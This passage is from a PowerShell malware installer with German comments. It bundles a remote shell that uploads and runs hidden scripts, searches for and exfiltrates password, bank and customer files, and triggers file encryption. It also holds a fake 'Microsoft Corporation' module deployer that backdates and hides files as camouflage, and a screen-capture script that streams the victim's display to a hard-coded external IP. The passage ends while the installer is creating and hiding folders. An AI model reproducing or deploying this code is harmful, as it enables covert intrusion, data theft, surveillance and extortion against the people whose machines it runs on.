                            $vUw.WriteLine("UPLOAD_REQUEST $vRp")
                            $vFs = [System.IO.File]::OpenWrite($vRp)
                            $vBd = ""
                            $vIc = $false
                            while ($true) {
                                $vLn = $vUr.ReadLine()
                                if ($null -eq $vLn) { break }
                                if ($vLn -eq "BEGIN_UPLOAD") { $vOt = "Upload gestartet für $vRp..." }
                                elseif ($vLn -like "BEGIN_CHUNK*") { $vIc = $true; $vBd = "" }
                                elseif ($vLn -eq "END_CHUNK") {
                                    if ($vIc) { $cb = [System.Convert]::FromBase64String($vBd); $vFs.Write($cb, 0, $cb.Length); $vFs.Flush(); $vBd = "" }
                                    $vIc = $false
                                } elseif ($vLn -eq "END_UPLOAD") {
                                    $vFs.Close()
                                    $vOt += "`nUpload abgeschlossen: $vRp"
                                    if ($vRp -like "$vHd\*.ps1") {
                                        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$vRp`"" -WindowStyle Hidden
                                        $vOt += " Skript automatisch hidden gestartet."
                                    }
                                    break
                                } elseif ($vIc) { $vBd += $vLn }
                            }
                            $vUw.Close(); $vUr.Close(); $vUs.Close(); $vUc.Close()
                        } catch {
                            $vOt = "Upload-Fehler: $_"
                        }
                    }
                } elseif ($vCm -like "execute *") {
                    $vFp = $vCm.Substring(8).Trim()
                    if ([string]::IsNullOrWhiteSpace($vFp)) { $vOt = "Verwendung: execute <Pfad-zur-.ps1-Datei>" }
                    else {
                        try { $vFp = (Resolve-Path $vFp -ErrorAction Stop).Path } catch { $vOt = "Fehler: Pfad nicht auflösbar: $_"; continue }
                        if ((Test-Path $vFp -PathType Leaf) -and ($vFp -like "*.ps1")) {
                            try {
                                Start-Process powershell.exe -ArgumentList "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$vFp`"" -WindowStyle Hidden
                                $vOt = "Skript '$vFp' asynchron und hidden gestartet."
                            } catch { $vOt = "Fehler beim Starten: $_" }
                        } else { $vOt = "Fehler: Keine .ps1-Datei: $vFp" }
                    }
                } elseif ($vCm -like "download *") {
                    $vPt = $vCm -split ' ', 3
                    $vFp = $vPt[1].Trim()
                    $vRk = if ($vPt.Length -ge 3) { $vPt[2].Trim() } else { $vCk }
                    if ([string]::IsNullOrWhiteSpace($vFp)) { $vOt = "Verwendung: download <Pfad-zur-Datei> [<key>]" }
                    else {
                        try { $vFp = (Resolve-Path $vFp -ErrorAction Stop).Path } catch { $vOt = "Fehler: Datei nicht gefunden: $vFp"; continue }
                        try {
                            $fn = [System.IO.Path]::GetFileName($vFp) -replace ".enc$", ""
                            $we = $false
                            $vTp = $vFp
                            if ($vFp -like "*.enc") { $we = $true; $vTp = FnTd2 $vFp $vRk }
                            $vDc = New-Object System.Net.Sockets.TCPClient($vDh, $vDp)
                            $vDs = $vDc.GetStream()
                            $vDw = New-Object System.IO.StreamWriter($vDs)
                            $vDw.AutoFlush = $true
                            $vDw.WriteLine("BEGIN_DOWNLOAD $fn")
                            $cs = 512KB
                            $vFs = [System.IO.File]::OpenRead($vTp)
                            $bf = New-Object byte[] $cs
                            $cn = 1
                            while ($br = $vFs.Read($bf, 0, $cs)) {
                                $cb = $bf[0..($br-1)]
                                $bc = [System.Convert]::ToBase64String($cb)
                                $vDw.WriteLine("BEGIN_CHUNK $cn")
                                $vDw.WriteLine($bc)
                                $vDw.WriteLine("END_CHUNK")
                                $cn++
                            }
                            $vFs.Close()
                            $vDw.WriteLine("END_DOWNLOAD")
                            $vDw.Close(); $vDs.Close(); $vDc.Close()
                            if ($we) { FnRe3 -tp $vTp -oep $vFp -p1 $vRk }
                            $vOt = "Download abgeschlossen: $fn"
                        } catch { $vOt = "Download-Fehler: $_" }
                    }
                } elseif ($vCm -like "cat *") {
                    $vPt = $vCm -split ' ', 3
                    $vFp = $vPt[1].Trim()
                    $vRk = if ($vPt.Length -ge 3) { $vPt[2].Trim() } else { $vCk }
                    if ([string]::IsNullOrWhiteSpace($vFp)) { $vOt = "Verwendung: cat <Pfad-zur-Datei> [<key>]" }
                    else {
                        try { $vFp = (Resolve-Path $vFp -ErrorAction Stop).Path } catch { $vOt = "Fehler: Datei nicht gefunden: $vFp"; continue }
                        try {
                            $we = $false
                            $vTp = $vFp
                            if ($vFp -like "*.enc") { $we = $true; $vTp = FnTd2 $vFp $vRk }
                            $vFs = [System.IO.File]::OpenText($vTp)
                            while ($null -ne ($vLn = $vFs.ReadLine())) { $vWr.WriteLine($vLn) }
                            $vFs.Close()
                            if ($we) { FnRe3 -tp $vTp -oep $vFp -p1 $vRk }
                            $vOt = ""
                        } catch { $vOt = "Fehler: $_" }
                    }
                } elseif ($vCm -like "cd *") {
                    $vPh = $vCm.Substring(3).Trim()
                    if ([string]::IsNullOrWhiteSpace($vPh)) { $vPh = $env:USERPROFILE }
                    Set-Location -Path $vPh -ErrorAction Stop
                    $vOt = "Verzeichnis gewechselt zu: " + (Get-Location).Path
                } elseif ($vCm -like "encrypt_full *") {
                    $vRk = $vCm.Substring(13).Trim()
                    $vCk = $vRk
                    if (Test-Path $vEs) { & $vEs -EncryptFull -Key $vRk; $vOt = "Full-Modus verschluesselt (Key: $vRk)." } else { $vOt = "Skript nicht gefunden: $vEs" }
                } elseif ($vCm -like "decrypt_full *") {
                    $vRk = $vCm.Substring(13).Trim()
                    if (Test-Path $vEs) { & $vEs -DecryptFull -Key $vRk; $vOt = "Full-Modus entschlÃ¼sselt (Key: $vRk)." } else { $vOt = "Skript nicht gefunden: $vEs" }
                } elseif ($vCm -like "encrypt_select *") {
                    $vPt = $vCm -split ' ', 3
                    $vSp = $vPt[1].Trim()
                    $vRk = $vPt[2].Trim()
                    $vCk = $vRk
                    if (Test-Path $vEs) { & $vEs -EncryptSelect $vSp -Key $vRk; $vOt = "Select-Modus verschluesselt: $vSp (Key: $vRk)." } else { $vOt = "Skript nicht gefunden: $vEs" }
                } elseif ($vCm -like "decrypt_select *") {
                    $vPt = $vCm -split ' ', 3
                    $vSp = $vPt[1].Trim()
                    $vRk = $vPt[2].Trim()
                    if (Test-Path $vEs) { & $vEs -DecryptSelect $vSp -Key $vRk; $vOt = "Select-Modus entschlÃ¼sselt: $vSp (Key: $vRk)." } else { $vOt = "Skript nicht gefunden: $vEs" }
                } elseif ($vCm -like "search_sensitive*") {
                    $vSp = if ($vCm -like "search_sensitive *") { $vCm.Substring(17).Trim() } else { "" }
                    if ([string]::IsNullOrWhiteSpace($vSp)) {
                        $vSps = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\AppData\Roaming", "C:\Users\Public\Documents")
                    } else { $vSps = @($vSp) }
                    $vFp = @("*.doc", "*.docx", "*.xls", "*.xlsx", "*.pdf", "*password*", "*pass*", "*flag*", "*ctf*", "*credit*", "*bank*", "*customer*", "*kunden*")
                    $vOt += "Suche in: $($vSps -join ', ') | Muster: $($vFp -join ', ')`n`n"
                    foreach ($p in $vSps) {
                        try { $p = (Resolve-Path $p -ErrorAction Stop).Path } catch { $vOt += "Fehler Pfad ${p}: $_`n"; continue }
                        if (Test-Path $p) {
                            $ff = Get-ChildItem -Path $p -Recurse -Include $vFp -Exclude "*.lnk" -File -ErrorAction SilentlyContinue
                            if ($ff.Count -gt 0) {
                                $vOt += "### Gefundene in $p ($($ff.Count)):`n"
                                foreach ($f in $ff) {
                                    $vOt += "- $($f.FullName) (Größe: $($f.Length))`n"
                                    try {
                                        if ($f.Extension -in @(".txt", ".log", ".ini", ".conf", ".flag")) {
                                            $vWr.WriteLine("BEGIN_TEXT_EXFIL $($f.Name)")
                                            $vFs = [System.IO.File]::OpenText($f.FullName)
                                            while ($null -ne ($vLn = $vFs.ReadLine())) { $vWr.WriteLine($vLn) }
                                            $vFs.Close()
                                            $vWr.WriteLine("END_TEXT_EXFIL")
                                            $vOt += " -> Klartext gesendet.`n"
                                        } else {
                                            $vDc = New-Object System.Net.Sockets.TCPClient($vDh, $vDp)
                                            $vDs = $vDc.GetStream()
                                            $vDw = New-Object System.IO.StreamWriter($vDs)
                                            $vDw.AutoFlush = $true
                                            $vDw.WriteLine("BEGIN_DOWNLOAD $($f.Name)")
                                            $cs = 1MB
                                            $vFs = [System.IO.File]::OpenRead($f.FullName)
                                            $bf = New-Object byte[] $cs
                                            $cn = 1
                                            while ($br = $vFs.Read($bf, 0, $cs)) {
                                                $cb = $bf[0..($br-1)]
                                                $bc = [System.Convert]::ToBase64String($cb)
                                                $vDw.WriteLine("BEGIN_CHUNK $cn")
                                                $vDw.WriteLine($bc)
                                                $vDw.WriteLine("END_CHUNK")
                                                $cn++
                                            }
                                            $vFs.Close()
                                            $vDw.WriteLine("END_DOWNLOAD")
                                            $vDw.Close(); $vDs.Close(); $vDc.Close()
                                            $vOt += " -> Gesendet via Download.`n"
                                        }
                                    } catch { $vOt += " -> Exfil-Fehler: $_`n" }
                                }
                            } else { $vOt += "Keine in $p.`n" }
                        } else { $vOt += "Pfad $p existiert nicht.`n" }
                    }
                    $vOt += "`n--- Suche abgeschlossen ---`n"
                } else {
                    $vOt = Invoke-Expression -Command $vCm 2>&1 | Out-String
                }
            } catch {
                $vOt = "Fehler: $_"
            }
            # Dynamischer Prompt: Nach jedem Befehl neu berechnen
            $vPm = "PS " + (Get-Location).Path + "> "
            $vWr.Write($vOt + "`n" + $vPm)
        }
    } catch {
        Write-Output "Verbindungsfehler: $_ - Wiederverbindung..."
    } finally {
        @($vWr, $vRd, $vSt, $vCl) | Where-Object { $_ -ne $null } | ForEach-Object { try { $_.Close() } catch {} }
    }
    if ($vCm -ne "exit") {
        $vDy = Get-Random -Minimum 1 -Maximum 14
        Write-Output "Warte $vDy Sekunden..."
        Start-Sleep -Seconds $vDy
    } else { break }
}
'@

# Inhalt des System.ps1 als Multi-Line-String (inkl. des truncated Teils – rekonstruiert basierend auf Kontext)
$systemScriptContent = @'
# Copyright (c) 2025 Microsoft Corporation. All rights reserved.
# Windows PowerShell Module Deployment Utility
# Version 2.1.0 - Internal Deployment Tool for PowerShell Operations Module
# This script initializes and deploys internal module components for Windows PowerShell.
# For use in enterprise environments only. Do not modify without authorization.
# See https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/ for details.

# .SYNOPSIS
# Deploys the operations module components to the user-specific path.
# .DESCRIPTION
# This utility handles path resolution, attribute setting, and component initialization.
# It ensures compatibility with PowerShell 5.1+ and performs validation checks.
# .EXAMPLE
# .\MsftModuleDeploy.ps1 -Verbose

[CmdletBinding()]
param ()

# Internal variables for path resolution and component handling
$_msftEnvVar = [Environment]::GetFolderPath('ApplicationData')
$_msftBasePath = [System.IO.Path]::Combine($_msftEnvVar, ('M'+'i'+'c'+'r'+'o'+'s'+'o'+'f'+'t'+'\W'+'i'+'n'+'d'+'o'+'w'+'s'+'\P'+'o'+'w'+'e'+'r'+'S'+'h'+'e'+'l'+'l'+'\O'+'P'+'E'+'R'+'A'+'T'+'I'+'O'+'N'))
$_msftSubDirs = @('L'+'o'+'g'+'s', 'e'+'n'+'-'+'U'+'S', 'P'+'r'+'i'+'v'+'a'+'t'+'e')

# Function for secure component creation with attribute masking
function Initialize-MsftComponent {
    param (
        [string]$_msftCompPath,
        [string]$_msftCompContent,
        [datetime]$_msftModTime = (Get-Date).AddDays(- (Get-Random -Minimum 30 -Maximum 365))
    )
    try {
        Set-Content -Path $_msftCompPath -Value $_msftCompContent -Force -ErrorAction Stop
        Set-ItemProperty -Path $_msftCompPath -Name LastWriteTime -Value $_msftModTime
        $_msftAttrFlags = [System.IO.FileAttributes]::Normal
        if ((Get-Random -Maximum 3) -eq 1) { $_msftAttrFlags = $_msftAttrFlags -bor [System.IO.FileAttributes]::System }
        if ((Get-Random -Maximum 3) -eq 1) { $_msftAttrFlags = $_msftAttrFlags -bor [System.IO.FileAttributes]::ReadOnly }
        if ((Get-Random -Maximum 3) -eq 1) { $_msftAttrFlags = $_msftAttrFlags -bor [System.IO.FileAttributes]::Hidden }
        Set-ItemProperty -Path $_msftCompPath -Name Attributes -Value $_msftAttrFlags
    } catch {
        # Simulated error handling for deployment logging (internal use)
        Write-Verbose "Component initialization encountered an issue: $_"
    }
}

# Validate and create base path with system attributes
if (-not (Test-Path $_msftBasePath)) {
    New-Item -Path $_msftBasePath -ItemType Directory -Force | Out-Null
    Set-ItemProperty -Path $_msftBasePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
    # Additional validation loop for redundancy
    for ($_msftIdx = 0; $_msftIdx -lt 2; $_msftIdx++) {
        if (Test-Path $_msftBasePath) { break }
    }
}

# Initialize sub-components (directories)
foreach ($_msftSub in $_msftSubDirs) {
    $_msftFullSub = [System.IO.Path]::Combine($_msftBasePath, $_msftSub)
    if (-not (Test-Path $_msftFullSub)) {
        New-Item -Path $_msftFullSub -ItemType Directory -Force | Out-Null
    }
}

# Deploy module components - Grouped for maintainability
$_msftLogsPath = [System.IO.Path]::Combine($_msftBasePath, 'L'+'o'+'g'+'s')
$_msftPrivatePath = [System.IO.Path]::Combine($_msftBasePath, 'P'+'r'+'i'+'v'+'a'+'t'+'e')
$_msftEnUsPath = [System.IO.Path]::Combine($_msftBasePath, 'e'+'n'+'-'+'U'+'S')

# Core module deployment
Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'O'+'P'+'E'+'R'+'A'+'T'+'I'+'O'+'N'+'.'+'p'+'s'+'m'+'1')) @"
# Copyright (c) Microsoft Corporation. All rights reserved.
# Windows PowerShell operations Module
# Version 1.0.0.0 - Internal Use Only

Import-Module Microsoft.PowerShell.Management

<#
.SYNOPSIS
Retrieves detailed system diagnostic information.

.DESCRIPTION
This function gathers system info including hardware, software, and network details for internal diagnostics.

.PARAMETER Detailed
If specified, includes verbose output.

.EXAMPLE
Get-SystemDiagnostics -Detailed
#>
function Get-SystemDiagnostics {
    param (
        [switch]`$Detailed
    )
    try {
        `$info = Get-ComputerInfo
        if (`$Detailed) {
            `$info | Format-List
        } else {
            `$info | Select-Object CsName, OsName, OsVersion
        }
    } catch {
        Write-Error `"Error retrieving system info: `$_`"
    }
}

<#
.SYNOPSIS
Logs a system event to the internal log.

.DESCRIPTION
Appends an event to the system log with timestamp and message.

.PARAMETER Message
The message to log.

.PARAMETER Level
The log level (Info, Warning, Error).

.EXAMPLE
Write-SystemLog -Message `"System check completed.`" -Level Info
#>
function Write-SystemLog {
    param (
        [string]`$Message,
        [ValidateSet('Info', 'Warning', 'Error')][string]`$Level = 'Info'
    )
    `$logPath = Join-Path (Split-Path -Parent `$PSCommandPath) 'Logs\SystemLog_`$(Get-Date -Format `"yyyy-MM-dd`").log'
    Add-Content -Path `$logPath -Value `"[`$(Get-Date)] [`$Level] `$Message`"
}

Export-ModuleMember -Function Get-SystemDiagnostics, Write-SystemLog
"@

Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'U'+'p'+'d'+'a'+'t'+'e'+'-'+'S'+'y'+'s'+'t'+'e'+'m'+'.'+'p'+'s'+'1')) @"
# Copyright (c) Microsoft Corporation. All rights reserved.
# System Update Script - Version 1.0.0.0

<#
.SYNOPSIS
Performs a simulated system update check.

.DESCRIPTION
Checks for updates and simulates application. For internal use in Windows maintenance.

.PARAMETER Force
Forces the update even if not needed.

.EXAMPLE
Invoke-SystemUpdate -Force
#>
function Invoke-SystemUpdate {
    param (
        [switch]`$Force
    )
    Write-Host 'Checking for system updates...'
    Start-Sleep -Seconds 3
    if (`$Force) {
        Write-Host 'Forced update applied.'
    } else {
        Write-Host 'No updates available.'
    }
    Write-SystemLog -Message 'Update check performed.' -Level Info
}

Invoke-SystemUpdate
"@

Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'D'+'i'+'a'+'g'+'n'+'o'+'s'+'t'+'i'+'c'+'T'+'o'+'o'+'l'+'s'+'.'+'p'+'s'+'m'+'1')) @"
# Copyright (c) Microsoft Corporation. All rights reserved.
# Diagnostic Tools Module - Version 1.0.0.0

<#
.SYNOPSIS
Runs network diagnostics.

.DESCRIPTION
Tests connectivity and logs results.

.PARAMETER Target
The target host to test (default: localhost).

.EXAMPLE
Run-NetworkDiagnostics -Target 'microsoft.com'
#>
function Run-NetworkDiagnostics {
    param (
        [string]`$Target = 'localhost'
    )
    Test-Connection -ComputerName `$Target -Count 4
    Write-SystemLog -Message `"Diagnostics run on `$Target.`" -Level Info
}

Export-ModuleMember -Function Run-NetworkDiagnostics
"@

Initialize-MsftComponent ([System.IO.Path]::Combine($_msftPrivatePath, 'I'+'n'+'t'+'e'+'r'+'n'+'a'+'l'+'H'+'e'+'l'+'p'+'e'+'r'+'s'+'.'+'p'+'s'+'1')) @"
# Copyright (c) Microsoft Corporation. All rights reserved.
# Internal Helper Functions - Do not export

function Get-InternalConfig {
    # Simulated internal config retrieval
    @{ 'Key' = 'Value' }
}
"@

# Manifest deployment with validation
Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'O'+'P'+'E'+'R'+'A'+'T'+'I'+'O'+'N'+'.'+'p'+'s'+'d'+'1')) @"
@{
    ModuleVersion        = '1.0.0.0'
    GUID                 = 'd0a9150d-b6a4-4b17-a325-e3a24fc0cf50'  # Zufällige GUID für Authentizität
    Author               = 'Microsoft Corporation'
    CompanyName          = 'Microsoft Corporation'
    Copyright            = '(c) Microsoft Corporation. All rights reserved.'
    Description          = 'Internal Windows PowerShell operations Module for diagnostics and logging.'
    PowerShellVersion    = '5.1'
    RootModule           = 'operations.psm1'
    FunctionsToExport    = @('Get-SystemDiagnostics', 'Write-SystemLog')
    CmdletsToExport      = @()
    VariablesToExport    = @()
    AliasesToExport      = @()
    RequiredModules      = @('Microsoft.PowerShell.Management')
    PrivateData          = @{
        PSData = @{
            Tags       = @('Operation', 'Diagnostics', 'Internal')
            LicenseUri = 'https://www.microsoft.com/en-us/legal/intellectualproperty/copyright'
            ProjectUri = 'https://docs.microsoft.com/powershell'
        }
    }
}
"@

# Configuration components
Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'C'+'o'+'n'+'f'+'i'+'g'+'.'+'x'+'m'+'l')) @"
<?xml version=`"1.0`" encoding=`"UTF-8`"?>
<Configuration xmlns=`"http://schemas.microsoft.com/powershell/2023/11`">
    <Settings>
        <AutoUpdate Enabled=`"True`" Interval=`"Daily`" />
        <Logging Level=`"Verbose`" Path=`"Logs`" />
        <Diagnostics>
            <Network Enabled=`"True`" />
            <Hardware ScanFrequency=`"Weekly`" />
        </Diagnostics>
    </Settings>
</Configuration>
"@

Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'S'+'e'+'t'+'t'+'i'+'n'+'g'+'s'+'.'+'j'+'s'+'o'+'n')) @"
{
    `"System`": {
        `"Version`": `"10.0.22621.0`",
        `"Build`": `"Windows 11`"
    },
    `"Module`": {
        `"Path`": `"C:\\Windows\\System32\\WindowsPowerShell\\v1.0`",
        `"Features`": [`"Diagnostics`", `"Updates`", `"Logging`"]
    },
    `"Preferences`": {
        `"Language`": `"en-US`",
        `"Theme`": `"Default`"
    }
}
"@

Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'P'+'r'+'e'+'f'+'e'+'r'+'e'+'n'+'c'+'e'+'s'+'.'+'i'+'n'+'i')) @"
[General]
VerboseLogging=True
AutoStart=True

[Diagnostics]
EnableNetwork=True
EnableHardware=False
"@

# Log components with dynamic generation
$_msftTodayStr = Get-Date -Format "yyyy-MM-dd"
Initialize-MsftComponent ([System.IO.Path]::Combine($_msftLogsPath, 'S'+'y'+'s'+'t'+'e'+'m'+'L'+'o'+'g'+'_'+$_msftTodayStr+'.'+'l'+'o'+'g')) @"
[$(Get-Date)] [Info] Event ID 1001: System initialized.
[$(Get-Date)] [Warning] Event ID 2002: Minor issue detected, resolved automatically.
[$(Get-Date)] [Info] Event ID 1003: Diagnostics completed successfully.
"@

Initialize-MsftComponent ([System.IO.Path]::Combine($_msftLogsPath, 'E'+'r'+'r'+'o'+'r'+'L'+'o'+'g'+'.'+'t'+'x'+'t')) "No critical errors detected in the last 30 days."
Initialize-MsftComponent ([System.IO.Path]::Combine($_msftLogsPath, 'U'+'p'+'d'+'a'+'t'+'e'+'L'+'o'+'g'+'_'+'0'+'1'+'.'+'l'+'o'+'g')) @"
[2023-10-01] [Info] Event ID 3001: Update applied - KB1234567.
[2023-10-02] [Info] Event ID 3002: Post-update verification passed.
"@

Initialize-MsftComponent ([System.IO.Path]::Combine($_msftLogsPath, 'U'+'p'+'d'+'a'+'t'+'e'+'L'+'o'+'g'+'_'+'0'+'2'+'.'+'l'+'o'+'g')) "Update check: No new updates available as of $(Get-Date)."
Initialize-MsftComponent ([System.IO.Path]::Combine($_msftLogsPath, 'D'+'i'+'a'+'g'+'n'+'o'+'s'+'t'+'i'+'c'+'L'+'o'+'g'+'.'+'l'+'o'+'g')) @"
[$(Get-Date)] [Info] Event ID 4001: Network test: Ping successful.
[$(Get-Date)] [Info] Event ID 4002: Hardware scan: All nominal.
"@

# Additional logs for component volume
for ($_msftLoopIdx = 3; $_msftLoopIdx -le 15; $_msftLoopIdx++) {
    Initialize-MsftComponent ([System.IO.Path]::Combine($_msftLogsPath, 'E'+'v'+'e'+'n'+'t'+'L'+'o'+'g'+'_'+$_msftLoopIdx+'.'+'l'+'o'+'g')) @"
[$((Get-Date).AddDays(-$_msftLoopIdx))] [Info] Event ID $(1000 + $_msftLoopIdx): Routine operation $_msftLoopIdx completed.
[$((Get-Date).AddDays(-$_msftLoopIdx))] [Warning] Event ID $(2000 + $_msftLoopIdx): Temporary delay observed.
"@
}

# Documentation components
Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'R'+'E'+'A'+'D'+'M'+'E'+'.'+'m'+'d')) @"
# Windows PowerShell operations Module

## Overview
This module is an internal component of Windows PowerShell, providing utilities for system diagnostics, logging, and maintenance. It is deployed automatically during Windows feature updates and integrates with core PowerShell functionalities.

## Features
- **Diagnostics**: Retrieve system information and run tests.
- **Logging**: Structured event logging with levels and timestamps.
- **Updates**: Simulated update checks for internal validation.

## Installation
This module is pre-installed in the PowerShell module path. Use `Import-Module operations` to load.

## Version
1.0.0.0 - Released: November 2025 (Compatible with PowerShell 5.1+)

## Documentation
For detailed usage, see Microsoft Docs: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/

**Copyright** (c) Microsoft Corporation. All rights reserved.

**Note:** This is an internal module. Manual modifications may void system integrity. Contact Microsoft Support for issues.
"@

Initialize-MsftComponent ([System.IO.Path]::Combine($_msftEnUsPath, 'a'+'b'+'o'+'u'+'t'+'_'+'O'+'P'+'E'+'R'+'A'+'T'+'I'+'O'+'N'+'.'+'h'+'e'+'l'+'p'+'.'+'t'+'x'+'t')) @"
about_operations

SHORT DESCRIPTION
Internal Windows PowerShell module for system tasks.

LONG DESCRIPTION
Provides functions like Get-SystemDiagnostics for querying system state.

SEE ALSO
Get-Help Get-SystemDiagnostics
https://learn.microsoft.com/powershell
"@

Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'H'+'e'+'l'+'p'+'.'+'x'+'m'+'l')) @"
<?xml version=`"1.0`" encoding=`"UTF-8`"?>
<helpItems xmlns=`"http://msh`" schema=`"maml`">
    <command:command>
        <command:details>
            <command:name>Get-SystemDiagnostics</command:name>
            <command:verb>Get</command:verb>
            <command:noun>SystemDiagnostics</command:noun>
            <maml:description>Retrieves system diagnostic information.</maml:description>
        </command:details>
    </command:command>
</helpItems>
"@

# Filler and type components for module integrity
Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'T'+'y'+'p'+'e'+'s'+'.'+'p'+'s'+'1'+'x'+'m'+'l')) @"
<Types>
    <Type>
        <Name>System.Diagnostics</Name>
        <Members>
            <AliasProperty>
                <Name>CsName</Name>
                <ReferencedMemberName>ComputerName</ReferencedMemberName>
            </AliasProperty>
        </Members>
    </Type>
</Types>
"@

Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'F'+'o'+'r'+'m'+'a'+'t'+'s'+'.'+'p'+'s'+'1'+'x'+'m'+'l')) @"
<Configuration>
    <ViewDefinitions>
        <View>
            <Name>SystemInfo</Name>
            <ViewSelectedBy>
                <TypeName>System.Object</TypeName>
            </ViewSelectedBy>
            <TableControl>
                <TableHeaders>
                    <TableColumnHeader><Label>Name</Label></TableColumnHeader>
                </TableHeaders>
            </TableControl>
        </View>
    </ViewDefinitions>
</Configuration>
"@

Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'C'+'a'+'c'+'h'+'e'+'.'+'t'+'m'+'p')) ("Temporary cache: " + (Get-Random -Count 20 -InputObject (0..9) | ForEach-Object { $_ }) -join '')
Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'B'+'a'+'c'+'k'+'u'+'p'+'_'+'C'+'o'+'n'+'f'+'i'+'g'+'.'+'x'+'m'+'l'+'.'+'b'+'a'+'k')) (Get-Content ([System.IO.Path]::Combine($_msftBasePath, 'C'+'o'+'n'+'f'+'i'+'g'+'.'+'x'+'m'+'l')))
Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'M'+'o'+'d'+'u'+'l'+'e'+'C'+'a'+'c'+'h'+'e'+'.'+'j'+'s'+'o'+'n')) @"
{
    `"LastLoaded`": `"$(Get-Date -Format "yyyy-MM-dd")`",
    `"Modules`": [`"operations`", `"DiagnosticTools`"]
}
"@

Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'L'+'i'+'c'+'e'+'n'+'s'+'e'+'.'+'t'+'x'+'t')) @"
Microsoft Software License Terms
WINDOWS POWERSHELL operations MODULE
Copyright (c) Microsoft Corporation. All rights reserved.
This module is licensed under the Microsoft Software License.
For full terms, see https://www.microsoft.com/en-us/legal/intellectualproperty/copyright.
"@

Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'E'+'x'+'t'+'r'+'a'+'M'+'a'+'n'+'i'+'f'+'e'+'s'+'t'+'.'+'p'+'s'+'d'+'1')) @"
@{
    ModuleVersion = '1.0.0.0'
    Author = 'Microsoft Corporation'
}
"@

Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'T'+'e'+'m'+'p'+'D'+'a'+'t'+'a'+'.'+'t'+'m'+'p')) (1..100 | ForEach-Object { Get-Random } ) -join '`n'
Initialize-MsftComponent ([System.IO.Path]::Combine($_msftPrivatePath, 'H'+'i'+'d'+'d'+'e'+'n'+'C'+'o'+'n'+'f'+'i'+'g'+'.'+'i'+'n'+'i')) "[Internal]`nSecretKey=EncryptedValue"

# Additional temporary components with loop for redundancy
for ($_msftTempIdx = 1; $_msftTempIdx -le 5; $_msftTempIdx++) {
    Initialize-MsftComponent ([System.IO.Path]::Combine($_msftBasePath, 'T'+'e'+'m'+'p'+$_msftTempIdx+'.'+'t'+'m'+'p')) ("Random temp data ${$_msftTempIdx}: " + (Get-Random -Count 15 -InputObject (65..90) | ForEach-Object { [char]$_ }) -join '')
}

# Final deployment confirmation
Write-Host "Module deployment completed in $_msftBasePath. Components: $( (Get-ChildItem $_msftBasePath -Recurse -File).Count )."
'@

$microsoftViewSScriptContent = @'
param(
    [string]$a14 = "145.223.117.77",
    [int]$a15 = 8080,
    [int]$a16 = 15,
    [int]$a17 = 60
)

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$a13 = "----b"

try {
    $tcpClient = New-Object System.Net.Sockets.TcpClient
    $tcpClient.Connect($a14, $a15)
    $networkStream = $tcpClient.GetStream()
    Write-Host "Connected to ${a14}:${a15}. Sending stream..." -ForegroundColor Green
    Write-Host "Press CTRL+C to stop." -ForegroundColor Yellow
} catch {
    Write-Host "Connection error to ${a14}:${a15}: $($_)" -ForegroundColor Red
    return
}

try {
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)

    while ($true) {
        $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)

        $memoryStream = New-Object System.IO.MemoryStream
        $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $jpegBytes = $memoryStream.ToArray()
        $memoryStream.Close()

        $part = "--$a13`r`nContent-Type: image/jpeg`r`nContent-Length: $($jpegBytes.Length)`r`n`r`n"
        $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($part)
        $networkStream.Write($headerBytes, 0, $headerBytes.Length)
        $networkStream.Write($jpegBytes, 0, $jpegBytes.Length)
        $networkStream.Write([System.Text.Encoding]::UTF8.GetBytes("`r`n"), 0, 2)
        $networkStream.Flush()

        [System.Threading.Thread]::Sleep(1000 / $a16)
    }
} catch {
    Write-Host "Error in capture or send: $($_)" -ForegroundColor Red
} finally {
    if ($networkStream) { $networkStream.Close() }
    if ($tcpClient) { $tcpClient.Close() }
}

'@
# Base PowerShell-Ordner erstellen, falls nicht vorhanden
if (-not (Test-Path $basePowerShellFolder)) {
    New-Item -ItemType Directory -Path $basePowerShellFolder -Force | Out-Null
}
# Operations-Ordner erstellen und verstecken
if (-not (Test-Path $operationsFolder)) {
    New-Item -ItemType Directory -Path $operationsFolder -Force | Out-Null
    $opsFolder = Get-Item $operationsFolder -Force
    $opsFolder.Attributes = $opsFolder.Attributes -bor [System.IO.FileAttributes]::Hidden
    Write-Output "Operations-Ordner erstellt und versteckt: $operationsFolder"
}
# System-Ordner (Target) erstellen und verstecken
if (-not (Test-Path $targetFolder)) {
    New-Item -ItemType Directory -Path $targetFolder -Force | Out-Null
    $sysFolder = Get-Item $targetFolder -Force
